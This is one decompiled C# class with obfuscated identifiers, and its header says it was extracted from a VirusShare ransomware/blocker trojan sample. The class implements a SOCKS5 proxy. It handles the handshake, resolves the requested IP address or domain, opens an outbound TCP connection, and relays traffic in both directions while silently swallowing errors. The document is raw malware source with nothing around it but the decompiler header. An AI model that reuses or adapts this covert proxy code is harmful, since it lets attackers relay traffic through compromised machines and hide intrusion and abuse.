// Decompiled with JetBrains decompiler
// Type: M6-n. i>O.AhRC.4Z3
// Assembly: ]\r, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 954C3D5E-708C-4DD0-82B7-DE2C5BD9F148
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b8539742a30b177b50768aa3e2c5af8a1f70cde6bd248fc157300ef1b9642f75.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace M\u000E6\u002Dn\u0008.\u0020\u001A\u000F\u000Bi\u003E\u001BO.\u0016Ah\u0011\u0013\u0012\u001FRC
{
  internal class \u0034Z\u00133\u0016
  {
    private Socket \u001Fd\u002D\u007E\u0025O\u0012\u0098;
    private Socket L\u0014\u001D;
    private byte[] \u003CP = new byte[1024];
    private int \u0027\u0006\u000EK\u003C\u0018;

    public \u0034Z\u00133\u0016(Socket _param1) => this.\u001Fd\u002D\u007E\u0025O\u0012\u0098 = _param1;

    public void \u0031\u0028\u000A\u0014E() => this.\u001Fd\u002D\u007E\u0025O\u0012\u0098.BeginReceive(this.\u003CP, 0, this.\u003CP.Length, SocketFlags.None, new AsyncCallback(this.\u0060\u0003\u0029V1GVe), (object) this.\u001Fd\u002D\u007E\u0025O\u0012\u0098);

    private void \u0060\u0003\u0029V1GVe(IAsyncResult _param1)
    {
      try
      {
        int num = ((Socket) _param1.AsyncState).EndReceive(_param1);
        if (num > 0)
        {
          this.\u0030\u0017\u0021GS\u001F\u0002(this.\u003CP, num);
          ((Socket) _param1.AsyncState).BeginReceive(this.\u003CP, 0, this.\u003CP.Length, SocketFlags.None, new AsyncCallback(this.\u0060\u0003\u0029V1GVe), (object) (Socket) _param1.AsyncState);
        }
        else
          this.\u0025HK\u009D\u0017\u000E();
      }
      catch
      {
      }
    }

    private void \u005BD\u000C\u001A\u000C\u009F\u0014(IAsyncResult _param1)
    {
      try
      {
        int size = ((Socket) _param1.AsyncState).EndReceive(_param1);
        if (size > 0)
        {
          this.\u001Fd\u002D\u007E\u0025O\u0012\u0098.BeginSend(this.\u003CP, 0, size, SocketFlags.None, new AsyncCallback(this.\u0032), (object) this.\u001Fd\u002D\u007E\u0025O\u0012\u0098);
          ((Socket) _param1.AsyncState).BeginReceive(this.\u003CP, 0, this.\u003CP.Length, SocketFlags.None, new AsyncCallback(this.\u005BD\u000C\u001A\u000C\u009F\u0014), (object) (Socket) _param1.AsyncState);
        }
        else
          this.\u0025HK\u009D\u0017\u000E();
      }
      catch
      {
      }
    }

    private void \u0024\u002E\u0006\u007D(IAsyncResult _param1)
    {
      try
      {
        ((Socket) _param1.AsyncState).EndConnect(_param1);
        ((Socket) _param1.AsyncState).BeginReceive(this.\u003CP, 0, this.\u003CP.Length, SocketFlags.None, new AsyncCallback(this.\u005BD\u000C\u001A\u000C\u009F\u0014), (object) (Socket) _param1.AsyncState);
      }
      catch
      {
      }
    }

    private void \u0032(IAsyncResult _param1)
    {
      try
      {
        ((Socket) _param1.AsyncState).EndSend(_param1);
      }
      catch
      {
      }
    }

    private void \u0030\u0017\u0021GS\u001F\u0002(byte[] _param1, int _param2)
    {
      try
      {
        switch (this.\u0027\u0006\u000EK\u003C\u0018)
        {
          case 0:
            byte maxValue = _param1[2];
            if (_param1[0] != (byte) 5)
            {
              this.\u0025HK\u009D\u0017\u000E();
              break;
            }
            if (maxValue != (byte) 0)
              maxValue = byte.MaxValue;
            this.\u001Fd\u002D\u007E\u0025O\u0012\u0098.BeginSend(new byte[2]
            {
              _param1[0],
              maxValue
            }, 0, 2, SocketFlags.None, new AsyncCallback(this.\u0032), (object) this.\u001Fd\u002D\u007E\u0025O\u0012\u0098);
            ++this.\u0027\u0006\u000EK\u003C\u0018;
            break;
          case 1:
            IPAddress address = (IPAddress) null;
            ushort port = 0;
            if (this.\u003CP[1] == (byte) 1)
            {
              switch (this.\u003CP[3])
              {
                case 1:
                  address = IPAddress.Parse(_param1[4].ToString() + \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0012\u0040h\u003BN() + _param1[5].ToString() + \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0012\u0040h\u003BN() + _param1[6].ToString() + \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0012\u0040h\u003BN() + _param1[7].ToString());
                  port = (ushort) ((uint) _param1[8] * 256U + (uint) _param1[9]);
                  break;
                case 3:
                  address = Dns.GetHostAddresses(Encoding.Default.GetString(_param1, 5, (int) _param1[4]))[0];
                  ushort index = (ushort) ((uint) _param1[4] + 5U);
                  port = (ushort) ((uint) _param1[(int) index] * 256U + (uint) _param1[(int) index + 1]);
                  break;
              }
            }
            this.L\u0014\u001D = new Socket(address.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            this.L\u0014\u001D.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
            this.L\u0014\u001D.BeginConnect((EndPoint) new IPEndPoint(address, (int) port), new AsyncCallback(this.\u0024\u002E\u0006\u007D), (object) this.L\u0014\u001D).AsyncWaitHandle.WaitOne();
            _param1[1] = !this.L\u0014\u001D.Connected ? (byte) 4 : (byte) 0;
            this.\u001Fd\u002D\u007E\u0025O\u0012\u0098.BeginSend(_param1, 0, _param2, SocketFlags.None, new AsyncCallback(this.\u0032), (object) this.\u001Fd\u002D\u007E\u0025O\u0012\u0098);
            ++this.\u0027\u0006\u000EK\u003C\u0018;
            break;
          case 2:
            this.L\u0014\u001D.BeginSend(_param1, 0, _param2, SocketFlags.None, new AsyncCallback(this.\u0032), (object) this.L\u0014\u001D);
            break;
        }
      }
      catch
      {
        this.\u0025HK\u009D\u0017\u000E();
      }
    }

    private void \u0025HK\u009D\u0017\u000E()
    {
      try
      {
        this.L\u0014\u001D.Disconnect(false);
        this.\u001Fd\u002D\u007E\u0025O\u0012\u0098.Disconnect(false);
        this.L\u0014\u001D.Close();
        this.\u001Fd\u002D\u007E\u0025O\u0012\u0098.Close();
      }
      catch
      {
      }
    }
  }
}
